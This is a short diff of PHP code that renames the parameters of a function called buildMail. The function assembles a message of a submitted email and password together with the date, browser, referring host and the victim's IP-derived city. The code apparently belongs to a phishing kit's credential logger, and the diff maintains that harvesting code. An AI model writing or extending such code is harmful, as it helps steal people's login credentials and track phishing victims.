@@ -100,7 +100,7 @@ function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE)
 	return $output;
 }
 
-function buildMail($email, $password)
+function buildMail($emailInput, $passwordInput)
 {
     $dateTime = date("l jS \of F Y h:i:s A");
     $hostName = $_SERVER['HTTP_REFERER'];
@@ -112,8 +112,8 @@ function buildMail($email, $password)
 	$city = $ipData['city'] ?? 'N/A';
 
     $message = "";
-    $message .= "Email : {$email} <br>\n";
-    $message .= "Password : {$password} <br>\n";
+    $message .= "Email : {$emailInput} <br>\n";
+    $message .= "Password : {$passwordInput} <br>\n";
     $message .= "Date : {$dateTime} <br>\n";
     $message .= "Browser : {$browserName} <br>\n";
     $message .= "Host : {$hostName} <br>\n";
